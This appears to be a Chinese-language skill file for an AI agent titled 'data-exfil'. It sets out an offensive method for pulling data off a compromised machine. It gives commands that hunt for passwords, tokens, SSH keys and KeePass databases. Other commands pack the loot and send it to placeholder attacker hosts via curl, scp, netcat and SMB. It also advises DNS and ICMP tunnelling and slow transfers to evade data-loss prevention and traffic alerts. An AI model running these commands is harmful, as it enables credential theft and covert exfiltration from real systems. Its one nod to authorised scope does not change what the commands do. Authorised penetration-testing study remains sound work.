---
name: data-exfil
description: 安全的数据收集与传输方法论
when_to_use: 当需要从目标收集证据或传输文件时
allowed-tools: [Bash, Read, Write]
argument-hint: "<file-or-directory>"
arguments: [target]
user-invocable: true
context: inline
---

## 数据收集

### 1. 敏感数据定位

```bash
# Linux - 常见敏感文件
find / -name "*.conf" -o -name "*.cfg" -o -name "*.ini" 2>/dev/null | head -50
find / -name "*.db" -o -name "*.sqlite" -o -name "*.sql" 2>/dev/null
find / -name "id_rsa" -o -name "*.pem" -o -name "*.key" 2>/dev/null
grep -r "password\|secret\|token\|api_key" /etc/ /opt/ /var/ 2>/dev/null | head -50

# Windows - 常见敏感文件
dir /s /b C:\Users\*.txt C:\Users\*.doc C:\Users\*.xls 2>nul
findstr /si "password" C:\Users\*.xml C:\Users\*.ini C:\Users\*.txt 2>nul
dir /s /b C:\Users\*.kdbx  # KeePass 数据库
```

### 2. 数据打包

```bash
# Linux - 打包压缩
tar czf /tmp/evidence.tar.gz $ARGUMENTS
zip -r /tmp/evidence.zip $ARGUMENTS

# 分卷压缩（大文件）
split -b 10M /tmp/evidence.tar.gz /tmp/evidence.part.

# Windows
Compress-Archive -Path $ARGUMENTS -DestinationPath C:\Users\Public\evidence.zip
```

### 3. 数据传输

```bash
# HTTP 上传（攻击机起 HTTP 服务）
# 攻击机: python3 -m http.server 8080 (或 uploadserver)
curl -F "file=@/tmp/evidence.tar.gz" http://<attacker>:8080/upload

# SCP
scp /tmp/evidence.tar.gz attacker@<attacker_ip>:/loot/

# NC（简单但无加密）
# 攻击机: nc -lvp 9999 > evidence.tar.gz
# 目标机:
cat /tmp/evidence.tar.gz | nc <attacker> 9999

# Base64 编码（小文件，通过终端复制）
base64 -w0 /tmp/evidence.tar.gz

# SMB（Windows）
copy C:\Users\Public\evidence.zip \\<attacker>\share\
```

### 4. 隐蔽传输

```bash
# DNS 隧道（绕过防火墙）
# 使用 dnscat2 或 iodine

# ICMP 隧道
# 使用 icmpsh 或 ptunnel

# HTTPS（混入正常流量）
curl -k -X POST https://<attacker>/upload -d @/tmp/evidence.tar.gz
```

### 5. 决策树

```
需要传输数据
  ├── 网络无限制
  │     ├── 小文件 → base64 + 终端复制
  │     ├── 中等文件 → SCP / HTTP 上传
  │     └── 大文件 → 分卷 + SCP
  ├── 出站受限
  │     ├── 仅 DNS → DNS 隧道
  │     ├── 仅 HTTPS → HTTPS POST
  │     └── 仅 ICMP → ICMP 隧道
  └── 高度监控环境
        ├── 加密传输（避免 DLP）
        └── 低速慢传（避免流量告警）
```

### 6. 注意事项

- 仅收集授权范围内的数据
- 传输完成后清理目标上的临时文件
- 记录所有收集的数据清单
- 使用加密传输保护数据
- 遵守数据处理协议
